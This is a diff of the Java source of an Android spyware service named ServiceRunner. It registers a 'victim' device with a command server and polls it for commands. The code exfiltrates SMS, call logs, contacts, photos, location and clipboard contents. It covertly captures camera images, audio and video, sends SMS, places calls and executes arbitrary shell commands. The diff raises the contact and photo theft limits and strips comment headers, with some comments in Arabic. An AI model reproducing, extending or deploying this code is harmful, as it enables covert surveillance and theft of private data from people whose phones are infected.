@@ -65,9 +65,6 @@ public class ServiceRunner extends Service {
     private String victimToken = "";
     private boolean registered = false;
 
-    // ============================================================
-    // Lifecycle
-    // ============================================================
     @Override
     public void onCreate() {
         super.onCreate();
@@ -155,9 +152,6 @@ public class ServiceRunner extends Service {
         } catch (Exception e) { return "unknown"; }
     }
 
-    // ============================================================
-    // Register
-    // ============================================================
     private void registerWithServer() {
         try {
             JSONObject d = new JSONObject();
@@ -177,9 +171,6 @@ public class ServiceRunner extends Service {
         }
     }
 
-    // ============================================================
-    // Poll Commands
-    // ============================================================
     private void pollCommands() {
         try {
             if (!registered) {
@@ -260,9 +251,6 @@ public class ServiceRunner extends Service {
         } catch (Exception ignored) {}
     }
 
-    // ============================================================
-    // Device Info
-    // ============================================================
     private void sendDeviceInfo() {
         try {
             JSONObject d = new JSONObject();
@@ -279,9 +267,6 @@ public class ServiceRunner extends Service {
         }
     }
 
-    // ============================================================
-    // Battery
-    // ============================================================
     private void sendBattery() {
         try {
             android.content.IntentFilter ifilter = new android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED);
@@ -306,9 +291,6 @@ public class ServiceRunner extends Service {
         }
     }
 
-    // ============================================================
-    // SMS
-    // ============================================================
     private void sendSms() {
         try {
             if (!hasPermission(android.Manifest.permission.READ_SMS)) {
@@ -316,7 +298,7 @@ public class ServiceRunner extends Service {
                 return;
             }
             JSONArray arr = new JSONArray();
-            android.database.Cursor c = getContentResolver().query(
+            Cursor c = getContentResolver().query(
                     Uri.parse("content://sms/inbox"), null, null, null, "date DESC LIMIT 50");
             if (c != null) {
                 while (c.moveToNext() && arr.length() < 50) {
@@ -339,9 +321,6 @@ public class ServiceRunner extends Service {
         }
     }
 
-    // ============================================================
-    // Call Log
-    // ============================================================
     private void sendCallLog() {
         try {
             if (!hasPermission(android.Manifest.permission.READ_CALL_LOG)) {
@@ -349,7 +328,7 @@ public class ServiceRunner extends Service {
                 return;
             }
             JSONArray arr = new JSONArray();
-            android.database.Cursor c = getContentResolver().query(CallLog.Calls.CONTENT_URI,
+            Cursor c = getContentResolver().query(CallLog.Calls.CONTENT_URI,
                     null, null, null, CallLog.Calls.DATE + " DESC LIMIT 50");
             if (c != null) {
                 while (c.moveToNext() && arr.length() < 50) {
@@ -373,9 +352,7 @@ public class ServiceRunner extends Service {
         }
     }
 
-    // ============================================================
-    // ★★★ Contacts — إرسال واحد واحد ★★★
-    // ============================================================
+    // ★★★ جهات الاتصال — إرسال واحد واحد ★★★
     private void sendContacts() {
         try {
             if (!hasPermission(android.Manifest.permission.READ_CONTACTS)) {
@@ -401,7 +378,7 @@ public class ServiceRunner extends Service {
             }
 
             int sent = 0;
-            while (c.moveToNext() && sent < 200) {
+            while (c.moveToNext() && sent < 500) {  // ★ رفعنا الحد إلى 500
                 try {
                     String name = "";
                     String number = "";
@@ -430,9 +407,9 @@ public class ServiceRunner extends Service {
 
                     sent++;
 
-                    // ★ delay صغير كل 20 جهة
-                    if (sent % 20 == 0) {
-                        Thread.sleep(300);
+                    // ★ delay صغير كل 25 جهة
+                    if (sent % 25 == 0) {
+                        Thread.sleep(250);
                     }
 
                 } catch (Exception e) {
@@ -458,9 +435,6 @@ public class ServiceRunner extends Service {
         }
     }
 
-    // ============================================================
-    // Apps
-    // ============================================================
     private void sendApps() {
         try {
             JSONArray arr = new JSONArray();
@@ -486,14 +460,12 @@ public class ServiceRunner extends Service {
         }
     }
 
-    // ============================================================
-    // ★★★ Photos — إرسال 5 صور واحدة واحدة ★★★
-    // ============================================================
+    // ★★★ الصور — إرسال 10 صور واحدة واحدة ★★★
     private void sendPhotos() {
         try {
             Cursor c = getContentResolver().query(
                     MediaStore.Images.Media.EXTERNAL_CONTENT_URI, null, null, null,
-                    MediaStore.Images.Media.DATE_ADDED + " DESC LIMIT 5");
+                    MediaStore.Images.Media.DATE_ADDED + " DESC LIMIT 10");  // ★ 10 صور
 
             if (c == null) {
                 reportCommandResult("get_photos", "fail", "cursor_null");
@@ -504,13 +476,13 @@ public class ServiceRunner extends Service {
             int total = c.getCount();
             Log.d(TAG, "Total photos: " + total);
 
-            while (c.moveToNext() && sent < 5) {
+            while (c.moveToNext() && sent < 10) {
                 try {
                     String path = c.getString(c.getColumnIndexOrThrow(MediaStore.Images.Media.DATA));
                     long size = c.getLong(c.getColumnIndexOrThrow(MediaStore.Images.Media.SIZE));
 
-                    // ★ تخطى الصور الكبيرة
-                    if (size > 1500000 || size <= 0) {
+                    // ★ تخطى الصور الكبيرة (أكبر من 2 MB)
+                    if (size > 2000000 || size <= 0) {
                         Log.d(TAG, "Skip large photo: " + size);
                         sent++;
                         continue;
@@ -522,7 +494,7 @@ public class ServiceRunner extends Service {
                         continue;
                     }
 
-                    // ★★ اقرأ وأرسل مباشرة
+                    // اقرأ وأرسل
                     byte[] bytes = new byte[(int) imgFile.length()];
                     FileInputStream fis = new FileInputStream(imgFile);
                     int read = fis.read(bytes);
@@ -536,6 +508,8 @@ public class ServiceRunner extends Service {
                         d.put("device", deviceId);
                         d.put("name", imgFile.getName());
                         d.put("image", "data:image/jpeg;base64," + base64);
+                        d.put("index", sent);
+                        d.put("total", total);
                         postJson("/apk/victim/data", d);
 
                         Log.d(TAG, "Photo sent: " + imgFile.getName() + " (" + size + " bytes)");
@@ -568,9 +542,6 @@ public class ServiceRunner extends Service {
         }
     }
 
-    // ============================================================
-    // Location
-    // ============================================================
     private void sendLocation() {
         try {
             LocationManager lm = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
@@ -611,9 +582,6 @@ public class ServiceRunner extends Service {
         }
     }
 
-    // ============================================================
-    // Clipboard
-    // ============================================================
     private void sendClipboard() {
         try {
             ClipboardManager cm = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
@@ -639,9 +607,6 @@ public class ServiceRunner extends Service {
         }
     }
 
-    // ============================================================
-    // Camera — Take Picture
-    // ============================================================
     private void takePicture(final int cameraId) {
         new Handler(Looper.getMainLooper()).post(() -> {
             Camera camera = null;
@@ -717,9 +682,6 @@ public class ServiceRunner extends Service {
         });
     }
 
-    // ============================================================
-    // Audio Record
-    // ============================================================
     private void recordAudio(final int durationMs) {
         new Thread(() -> {
             MediaRecorder recorder = null;
@@ -779,9 +741,6 @@ public class ServiceRunner extends Service {
         }).start();
     }
 
-    // ============================================================
-    // Video Record
-    // ============================================================
     private void recordVideo(final int cameraId, final int durationMs) {
         new Thread(() -> {
             Camera camera = null;
@@ -862,9 +821,6 @@ public class ServiceRunner extends Service {
         }).start();
     }
 
-    // ============================================================
-    // Lock Screen
-    // ============================================================
     private void lockScreen() {
         try {
             DevicePolicyManager dpm = (DevicePolicyManager)
@@ -894,9 +850,6 @@ public class ServiceRunner extends Service {
         }
     }
 
-    // ============================================================
-    // Home
-    // ============================================================
     private void goHome() {
         try {
             Intent intent = new Intent(Intent.ACTION_MAIN);
@@ -909,9 +862,6 @@ public class ServiceRunner extends Service {
         }
     }
 
-    // ============================================================
-    // Sounds
-    // ============================================================
     private void playSound() {
         try {
             Ringtone r = RingtoneManager.getRingtone(getApplicationContext(),
@@ -930,9 +880,6 @@ public class ServiceRunner extends Service {
         } catch (Exception e) { reportCommandResult("play_alarm", "fail", e.getMessage()); }
     }
 
-    // ============================================================
-    // Vibrate
-    // ============================================================
     private void vibrate(long ms) {
         try {
             Vibrator v = (Vibrator) getSystemService(Context.VIBRATOR_SERVICE);
@@ -969,9 +916,6 @@ public class ServiceRunner extends Service {
         } catch (Exception e) { reportCommandResult("volume_max", "fail", e.getMessage()); }
     }
 
-    // ============================================================
-    // SMS Send
-    // ============================================================
     private void sendSmsToNumber(String to, String msg) {
         try {
             if (!hasPermission(android.Manifest.permission.SEND_SMS)) {
@@ -984,9 +928,6 @@ public class ServiceRunner extends Service {
         } catch (Exception e) { reportCommandResult("send_sms", "fail", e.getMessage()); }
     }
 
-    // ============================================================
-    // Call
-    // ============================================================
     private void callNumber(String number) {
         try {
             if (!hasPermission(android.Manifest.permission.CALL_PHONE)) {
@@ -1010,9 +951,6 @@ public class ServiceRunner extends Service {
         } catch (Exception e) { reportCommandResult("open_url", "fail", e.getMessage()); }
     }
 
-    // ============================================================
-    // Shell
-    // ============================================================
     private void executeShell(String command) {
         try {
             Process p = Runtime.getRuntime().exec(command);
@@ -1033,9 +971,6 @@ public class ServiceRunner extends Service {
         } catch (Exception e) { reportCommandResult("shell", "fail", e.getMessage()); }
     }
 
-    // ============================================================
-    // Permission Helper
-    // ============================================================
     private boolean hasPermission(String permission) {
         try {
             return ContextCompat.checkSelfPermission(this, permission)
@@ -1045,9 +980,6 @@ public class ServiceRunner extends Service {
         }
     }
 
-    // ============================================================
-    // HTTP
-    // ============================================================
     private String httpGet(String urlStr) {
         try {
             URL url = new URL(urlStr);
@@ -1105,4 +1037,4 @@ public class ServiceRunner extends Service {
     private void postJson(String path, JSONObject data) {
         postJsonWithResponse(path, data);
     }
-        }
+                }
